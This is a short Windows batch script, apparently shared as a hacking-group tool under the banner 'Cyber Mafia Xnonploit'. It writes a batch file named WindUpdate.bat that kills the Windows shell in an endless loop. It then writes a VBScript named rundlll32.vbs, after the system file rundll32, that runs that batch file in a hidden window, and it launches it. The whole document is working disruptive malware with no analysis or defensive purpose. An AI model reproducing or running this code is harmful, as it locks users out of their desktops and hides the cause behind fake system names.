:::::::::::::::::::::::::
::Cyber Mafia Xnonploit::
:::::::::::::::::::::::::
@echo off

echo :a >>WindUpdate.bat
echo tskill explorer >>WindUpdate.bat
echo goto a >>WindUpdate.bat
echo Set objShell = CreateObject("WScript.Shell")>>rundlll32.vbs
echo strCommand = "WindUpdate.bat">>rundlll32.vbs
echo objShell.Run strCommand, vbHide, TRUE>>rundlll32.vbs
start "" rundlll32.vbs
